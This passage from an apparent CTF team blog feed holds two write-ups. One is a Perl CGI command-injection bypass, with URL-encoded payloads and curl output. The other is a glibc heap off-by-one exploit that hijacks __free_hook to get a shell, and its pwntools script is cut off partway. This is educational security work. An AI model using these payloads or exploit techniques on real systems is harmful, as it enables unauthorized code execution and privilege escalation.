href="https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html" target="_blank" rel="noopener">blog</a> as he said this is a module to <strong>hook</strong> all dangerous Perl invocations like system, open, backtick etc…</p><p>This module is called it’s source code at <strong><a href="http://13.231.137.9/DSSafe.pm" target="_blank" rel="noopener">http://13.231.137.9/DSSafe.pm</a></strong>:</p><p>The full source code can be found at <a href="https://pastebin.com/EyY7UWAX" target="_blank" rel="noopener">https://pastebin.com/EyY7UWAX</a></p><p>This module replaces the original <strong>system</strong> and implements its own command line parser which blocks some bad characters like:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\&amp;\*\(\)\&#123;\&#125;\[\]\`\;\|\?\n~&lt;&gt;]</span><br></pre></td></tr></table></figure><p>So the idea behind to bypass this restritions is to run perl script via <strong>strerr</strong> by using tcpdump ‘-r’ option, this option tries to read a file and this is what happens when we try to read a file that doesn’t exist with tcpdump:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tcpdump -d -r 123</span><br><span class="line">tcpdump: 123: No such file or directory</span><br></pre></td></tr></table></figure><p>As you can see we can control the file name (123) so we can use the name to inject our perl code, but we have two aditional parts to consider so we don’t get errors while running it this error message.</p><p>The first one is the <strong>tcpdump:</strong> part luckly in perl this will interpreted as a <strong>goto</strong> jump label this is something that you can do also in <strong>c</strong> or on assembly(labels where we can jump to) we won’t have any compilation problems with this so lets move on.</p><p>The second one is <strong>: No such file or directory</strong> this won’t compile unless we remove by using a comment just like we do when we are performing sql injection, so lets test if this works in the command line:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tcpdump -d -r <span class="string">'print 123#'</span> 2&gt;&amp;1 | perl -</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>As you can see it works here is a visual image from orange blog how the perl script looks like in a highlighter:</p><p><img src="https://1.bp.blogspot.com/-2bmmwKH2Er8/XW0DfygFjLI/AAAAAAAAEWc/srwYqeeUj7QSGvd1FmUHMasLezoiTFrUwCLcBGAs/s1600/upload_153c58ab7d99f019e4090a3a600261a0%255B1%255D.png" alt></p><p>We can’t really control stdout in the application so we need to redirect the stderr into a file and use the backdoor present here:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># backdoor :)</span></span><br><span class="line"><span class="keyword">my</span> $tpl = CGI::param(<span class="string">"tpl"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">length</span> $tpl &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">index</span>($tpl, <span class="string">".."</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">    $tpl = <span class="string">"./tmp/"</span> . $tpl . <span class="string">".thtml"</span>;</span><br><span class="line">    <span class="keyword">require</span>($tpl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So if we send our payload to a file at <strong>./tmp</strong> and pass the file name to tpl get parameter, require will execute as perl and we get <strong>RCE</strong>.</p><p>Our final payload will require a <strong>&lt;</strong> in the end to fool <strong>DSSAFE.pm</strong> and redirect <strong>STDERR</strong> into a folder that we can write and read, this folder is <strong>./tmp</strong> :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r$x=<span class="string">"ls /"</span>,<span class="keyword">exec</span>$x<span class="comment"># 2&gt;./tmp/qw.thtml &lt;&amp;tpl=qw</span></span><br></pre></td></tr></table></figure><p>And now url encoding the string:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r<span class="variable">$x</span>=<span class="string">"ls%20/"</span>,<span class="built_in">exec</span><span class="variable">$x</span>%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw</span><br></pre></td></tr></table></figure><p>Adding some backslashes to dolar sign so the variable isn’t evaluated as a bash variable:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r\<span class="variable">$x</span>=<span class="string">"ls%20/"</span>,<span class="built_in">exec</span>\<span class="variable">$x</span>%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw</span><br></pre></td></tr></table></figure><p>Using curl to test our payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">"http://13.231.137.9/cgi-bin/diag.cgi?options=-r\$x=\"ls%20/\",exec\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw"</span></span><br><span class="line"><span class="variable">$READ_FLAG</span>$</span><br><span class="line">FLAG</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">initrd.img.old</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">snap</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">vmlinuz.old</span><br></pre></td></tr></table></figure><p>And it worked we managed to run <strong>ls</strong>, but we now see <code>$READ_FLAG$</code> which is an executable and the file <strong>FLAG</strong> containing the flag , we don’t rights to read directly only root can, our user is <strong>www-data</strong>, but if we manage to run the executable <code>$READ_FLAG$</code> (setuid bit is enabled so it will run as root which is the file owner). </p><p>I run into some problems because of the file name there is some shitty symbols($) so we need to do some tricks to be able to execute:</p><ul><li>Backslash with <strong>\x5c</strong> dolar signs so they won’t be interpreted as a bash variable.</li><li>Write dolar signs as <strong>\x24</strong> so they won’t be interpreted as a perl variable in a double quoted string.</li><li>Use <strong>sh -c ‘executable’</strong> to execute the binary.</li></ul><p>The final payload without url encoding looks like this:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r\$x=\<span class="string">"sh -c '/\x5c\x24READ_FLAG\x5c\x24'"</span>,<span class="keyword">exec</span>\$x<span class="comment"># 2&gt;./tmp/qw.thtml &lt;&amp;tpl=qw</span></span><br></pre></td></tr></table></figure><p>With url encoding:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r\$x=\<span class="string">"sh%20-c%20'/\x5c\x24READ_FLAG\x5c\x24'\",exec\$x%23%202&gt;./tmp/qw.thtml%20&amp;tpl=qw</span></span><br></pre></td></tr></table></figure><p>Running with curl:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">"http://13.231.137.9/cgi-bin/diag.cgi?options=-r\$x=\"sh%20-c%20'/\x5c\x24READ_FLAG\x5c\x24'\",exec\$x%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw"</span></span><br><span class="line">hitcon&#123;Now I<span class="string">'m sure u saw my Bl4ck H4t p4p3r :P&#125;</span></span><br></pre></td></tr></table></figure></p><p>The flag was:<br><img src="https://i.imgur.com/DEbUX4H.png" alt></p><p>References:</p><ul><li><a href="https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html" target="_blank" rel="noopener">https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html</a></li><li><a href="https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Virtual Public Network [183pts]&lt;/p&gt;
&lt;p&gt;Vulnerable Point of Your Network :)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://13.231.137.9&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="perl" scheme="https://teamrocketist.github.io/tags/perl/"/>
    
      <category term="cgi" scheme="https://teamrocketist.github.io/tags/cgi/"/>
    
      <category term="vpnssl" scheme="https://teamrocketist.github.io/tags/vpnssl/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] PwnThyBytes 2019 - Baby Factory</title>
    <link href="https://teamrocketist.github.io/2019/09/30/Pwn-PwnThyBytes-2019-Baby-Factory/"/>
    <id>https://teamrocketist.github.io/2019/09/30/Pwn-PwnThyBytes-2019-Baby-Factory/</id>
    <published>2019-09-30T11:48:53.000Z</published>
    <updated>2020-02-10T16:16:18.790Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Baby Factory<br>100</p><p>Author: FedEx</p><p>In order to keep the world perfectly balanced, as all things should be, we’ve designed a management system.</p><p>Don’t forget, with great power comes great responsability!</p><p>Prove yourself worthy.</p><p>nc 137.117.216.128 13373</p><p><a href="https://mega.nz/#F!mjg2wQBT!Jm6rb3meWpIRR6pkpv_SrQ" target="_blank" rel="noopener">Download</a></p></blockquote><p>Another heap challenge, libc-2.23 is used so no <strong>tcache</strong> on this version .</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file babyfactory</span><br><span class="line">babyfactory: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=e40dbc48ecfd16e9c12a93c42520cf9f85e2671b, stripped</span><br></pre></td></tr></table></figure><p>With this we know:</p><ul><li>ELF compiled for x86_x64 architecture.</li><li>Dynamically linked.</li><li>Stripped (A little bit harder to reverse).</li></ul><p>As usual the next thing is to check the security of the binary<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babyfactory</span><br><span class="line">[*] <span class="string">'/ctf/pwnthybytes2019/pwn/babyfactory/babyfactory'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>Brief analysis of these protections:</p><ul><li>FULL RELRO (<strong>GOT</strong> entries are read only we can’t overwrite them)</li><li>STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to <strong>leak</strong> it)</li><li>The Stack is not executable (We can’t execute shellcode, techniques like <strong>ROP</strong> can bypass this)</li><li>PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li></ul><h3 id="Testing-the-binary"><a href="#Testing-the-binary" class="headerlink" title="Testing the binary"></a>Testing the binary</h3><p>The binary comes with the usual options on a normal heap challenge, create, edit,lists and eliminate.</p><p>Let’s start by doing static analysis on create and edit:<br><a data-fancybox="gallery" href="https://i.imgur.com/I0nAh0U.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/I0nAh0U.png" alt><br></a></p><p>Delete <strong>doesn’t</strong> have any kind of vulnerability so <strong>no</strong> double free or use after free possible, print will show every <strong>allocated object</strong>,  <strong>create</strong> is limited to <strong>7 mallocs</strong> because of variable at <strong>piebase+0x202024</strong> this variable increases at <strong>each allocation</strong> and goes up to <strong>7</strong>, after that <strong>no</strong> more allocations are allowed and the string “Too many, sorry” is shown.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>We have some limitations on the allocation sizes we can only do <strong>0x68,0x69 and 0x10</strong>, because of this all the chunks when freed will fall into <strong>fastbin range</strong>. </p><p>We can use <strong>off by one</strong> vulnerability to overflow the size of a chunk to be able to get a greater sized chunk  ultrapassing the fastbin range (0x81), this is useful to get a chunk into an <strong>unsorted bin</strong> to get a leak of a <strong>libc</strong> address. </p><p>We can also use this to manage to get <strong>arbitrary write</strong> by changing the pointer of char* name to the address we want for example free_hook and update its value into system to get a shell.</p><p>The memory layout on the heap will be a little weird because of the created struct, <strong>malloc(0x10)</strong> stores the pointers/values of objects of the <strong>struct xpto</strong>. </p><p>Normally when we are programming in c we do <code>malloc(sizeof(struct xpto))</code> and <code>sizeof(struct xpto)</code> is equal to <strong>0x10</strong> and why? since we have a <code>char*</code> pointer and a <code>long</code> integer are the “objects” of the struct the memory needed to store it is <strong>0x8 for the char*</strong> and <strong>0x8 for the long int</strong> this makes <strong>0x8+0x8=0x10</strong>.</p><p>This the view of a struct object in memory:<br><a data-fancybox="gallery" href="https://i.imgur.com/5YdkpUR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/5YdkpUR.png" alt><br></a><br>The plan is:</p><ul><li>Malloc “boy chunk” A,B and C and set day to -1(0xfffffffff).</li><li>Edit will think A is a “girl chunk” we can use this to overflow the size of chunk B with 0x91.</li><li>Free chunk B (To achieve success on freeing this a fake chunk needs to be created at chunk B(name)) chunk will be inserted into unsorted bin updating fd and bk with libc addresses.</li><li>Next malloc will be placed right above of the freed chunk(chunk_overlap). </li><li>Leak libc with print.</li><li>Overflow again the size of 0x21 but this time to 0x71 by editing chunk A again.</li><li>Freeing chunk B will put this into a fastbin.</li><li>Use next boy allocation to update the new 0x21 chunk to 0x71 to prevent errors from security check for the next malloc.</li><li>Next allocated “boy chunk” will be placed right at the char* name pointer of chunk B, modify it with free_hook pointer.</li><li>By editing chunk B we will write into the char* name pointer which got modified previously by us into free_hook set it into system.</li><li>Edit chunk A data into ‘/bin/sh\x00’</li><li>Free chunk A to Trigger free_hook and get a shell.</li></ul><h3 id="Off-by-One"><a href="#Off-by-One" class="headerlink" title="Off by One"></a>Off by One</h3><p>Lets start by allocate 3 chunks with</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'B'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"C"</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/XZuG6S8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XZuG6S8.png" alt><br></a><br>Now we want to overwrite chunk B(0x21) size to 0x91 this way we can make this chunk into unsortedbin range:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x91'</span>*<span class="number">0x69</span>)</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/L6Sh7UP.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/L6Sh7UP.png" alt><br></a><br>Lets see what happens when we free this chunk:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/7pFQP8A.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7pFQP8A.png" alt><br></a><br>Now lets malloc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'\xb0'</span>, <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure></p><p><a data-fancybox="gallery" href="https://i.imgur.com/j2wo7wk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/j2wo7wk.png" alt><br></a><br>Now we can get libc address from index 1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">list()</span><br><span class="line">r.recvuntil(<span class="string">'[1] GIRL= '</span>)</span><br><span class="line">addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = addr<span class="number">-0x3c4bb0</span></span><br><span class="line">FREE_HOOK = LIBC+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">"LEAKED 0x%x"</span>, addr)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>, LIBC)</span><br><span class="line">log.info(<span class="string">"FREE_HOOK 0x%x"</span>, FREE_HOOK)</span><br></pre></td></tr></table></figure><p>Now it’s time to overflow chunk B again but this time to 0x71 and free it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x71'</span>*<span class="number">0x69</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/muJzhNH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/muJzhNH.png" alt><br></a><br>This is what happens if we don’t create that fake chunk at that location:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ root@ptb:/ctf/work/pwn/babyfactory<span class="comment"># python babyfactory.py</span></span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/babyfactory/babyfactory'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./babyfactory'</span>: pid 8668</span><br><span class="line">[*] LEAKED 0x7f0f80e67bb0</span><br><span class="line">[*] LIBC 0x7f0f80aa3000</span><br><span class="line">[*] FREE_HOOK 0x7f0f80e697a8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">*** Error <span class="keyword">in</span> `./babyfactory<span class="string">': free(): invalid next size (fast): 0x000055b286da70a0 ***</span></span><br></pre></td></tr></table></figure><p>Next size is zero making it an invalid size lets check the code in <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c#L3909" target="_blank" rel="noopener">malloc.c</a>:<br><a data-fancybox="gallery" href="https://i.imgur.com/3tjCD3E.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3tjCD3E.png" alt><br></a><br>Lets fix this by adjusting in the beginning of our script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>), <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"C"</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 2  separate the released chunk from the top chunk.</span></span><br></pre></td></tr></table></figure><p>Now free will work and we get this :<br><a data-fancybox="gallery" href="https://i.imgur.com/DmgxuqH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/DmgxuqH.png" alt><br></a><br>Now next malloc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>),<span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/7pXnJ0R.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7pXnJ0R.png" alt><br></a><br>As explained in the picture above p64(0)+p64(0)+p64(0)+p64(0x71) to bypass <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c#L3384" target="_blank" rel="noopener">this</a> security check:<br><a data-fancybox="gallery" href="https://i.imgur.com/cJOOtIc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/cJOOtIc.png" alt><br></a><br>Remember fastbin(0x70) is something like this right now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x70: 0x5620cb07a0b0 —▸ 0x5620cb07a0a0 ◂— 0x0</span><br></pre></td></tr></table></figure><p>Remember before we exchanged the size to 0x91 the old size was 0x21 this means that this was place that stored the pointers of the structure which means if we modify the first field of this chunk we will change the pointer of <strong>char* name</strong> into <strong>free_hook</strong> next edit will write directly into free_hook giving us an arbitrary write free of security checks:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, p64(FREE_HOOK),<span class="number">0xffffffff</span>) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><p>The look of the heap before the 1st pointer gets updated to free_hook:<br><a data-fancybox="gallery" href="https://i.imgur.com/EWP9H1C.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/EWP9H1C.png" alt><br></a><br>The look after update to free_hook occurs:<br><a data-fancybox="gallery" href="https://i.imgur.com/dsuVkAW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/dsuVkAW.png" alt><br></a><br>Now setting free_hook into system putting “/bin/sh” into index 0 , by freeing index 0 we trigger free_hook and get a shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>, p64(SYSTEM))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"137.117.216.128"</span>, <span class="string">"13373"</span></span><br><span class="line">filename = <span class="string">"./babyfactory"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(obj, name, day)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'[2] Girl \n &gt; '</span>,str(obj))</span><br><span class="line">r.sendafter(<span class="string">'Enter Name: '</span>, name)</span><br><span class="line">r.sendlineafter(<span class="string">'Enter Day: '</span>, str(day))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, name)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Enter Baby IDX: '</span>, str(index))</span><br><span class="line">r.sendafter(<span class="string">'Enter new name: '</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Enter Baby IDX: '</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> 